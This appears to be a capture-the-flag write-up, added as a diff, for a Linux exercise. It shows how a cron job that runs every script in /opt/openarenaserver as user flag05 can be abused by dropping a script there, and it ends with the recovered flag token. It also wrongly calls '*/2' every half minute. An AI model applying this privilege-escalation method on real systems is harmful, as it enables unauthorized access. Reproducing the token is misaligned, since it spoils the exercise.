@@ -1,0 +1,27 @@
+When connection we have a new mail.
+Let's look what is inside: 'cd /var/mail'
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+We can understand this with these first caracter that it is a cronJob executing every half minute
+
+Now we will take a look at the script in /usr/sbin/openarenaserver
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Each file in /opt/openarenaserver is executed then deleted.
+
+With the cronJob the file is executed as flag05 which means we can exploit this.
+
+let's create a script in /opt/openarenaserver and wait a bit for the cronJob to execute it.
+
+echo 'getflag > /tmp/pass' > /opt/openarenaserver/flag.sh
+
+wait a bit and in /tmp/pass it should have the token
+
+viuaaale9huek52boumoomioc
